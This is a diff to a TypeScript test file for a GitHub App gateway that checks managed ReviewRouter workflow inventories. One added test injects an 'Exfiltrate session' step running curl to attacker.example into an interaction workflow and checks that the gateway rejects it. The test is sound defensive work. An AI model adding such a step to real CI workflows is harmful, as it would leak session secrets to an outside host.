@@ -3,6 +3,7 @@ import {
   CodexRotatingReviewActionV2Mode,
   renderCodexRotatingAdvisoryWorkflow,
 } from "@reviewrouter/features-codex-oauth-rotating";
+import { renderCodexRotatingInteractionWorkflow } from "@reviewrouter/features-workflow-provisioning";
 import { OctokitCodexRotatingGitHubSecretGateway } from "./octokit-codex-rotating-github-secret-gateway.js";
 
 const mocks = vi.hoisted(() => ({
@@ -258,6 +259,7 @@ describe("OctokitCodexRotatingGitHubSecretGateway", () => {
       compatible: true,
       inventoryHash: expect.stringMatching(/^[a-f0-9]{64}$/),
       actionCommitSha: expect.stringMatching(/^[a-f0-9]{40}$/),
+      defaultBranchHeadSha: expect.stringMatching(/^[a-f0-9]{40}$/),
     });
   });
 
@@ -853,6 +855,38 @@ describe("OctokitCodexRotatingGitHubSecretGateway", () => {
     ).resolves.toMatchObject({ compatible: false, actionCommitSha: actionSha });
   });
 
+  it("rejects extra interaction workflow steps even when the runtime pin matches", async () => {
+    const actionSha = "a".repeat(40);
+    const workflow = renderCodexRotatingAdvisoryWorkflow({
+      actionRef: `777genius/review-router@${actionSha}`,
+      apiUrl: "https://api.reviewrouter.site",
+      providerInstanceId: "codex-rotating:123456",
+      refreshScheduleCron: null,
+      reviewActionV2Mode: CodexRotatingReviewActionV2Mode.T0,
+    });
+    const interactionWorkflow = `${renderT0InteractionWorkflow(actionSha)}
+      - name: Exfiltrate session
+        run: curl https://attacker.example
+`;
+    mockManagedWorkflowInventory({
+      reviewWorkflow: workflow,
+      interactionWorkflow,
+    });
+    const gateway = new OctokitCodexRotatingGitHubSecretGateway({
+      appId: "123",
+      privateKey: "private-key",
+    });
+
+    await expect(
+      gateway.inspectReviewV2ManagedWorkflowInventory({
+        githubInstallationId: "129500385",
+        githubRepositoryId: "123456",
+        repositoryFullName: "777genius/example",
+        owner: "777genius",
+      }),
+    ).resolves.toMatchObject({ compatible: false, actionCommitSha: actionSha });
+  });
+
   it("resolves a pull_request_target scope from the signed workflow run", async () => {
     mocks.auth.mockResolvedValueOnce({
       token: "ghs_actions_read_token",
@@ -1206,22 +1240,9 @@ function fileContent(workflow: string) {
 }
 
 function renderT0InteractionWorkflow(actionSha: string) {
-  return `name: ReviewRouter Interaction
-
-permissions:
-  actions: write
-  id-token: write
-
-jobs:
-  interaction:
-    env:
-      RR_RUNTIME_REF: "${actionSha}"
-      REVIEWROUTER_RUNTIME_CONFIG_MODE: "oidc"
-      REVIEW_ROUTER_REVIEW_WORKFLOW_FILE: "reviewrouter-codex.yml"
-    steps:
-      - uses: actions/checkout@v6
-        with:
-          repository: 777genius/review-router
-          ref: \${{ env.RR_RUNTIME_REF }}
-`;
+  return renderCodexRotatingInteractionWorkflow({
+    actionRef: `777genius/review-router@${actionSha}`,
+    apiUrl: "https://api.reviewrouter.site",
+    runtimeConfigMode: "oidc",
+  });
 }
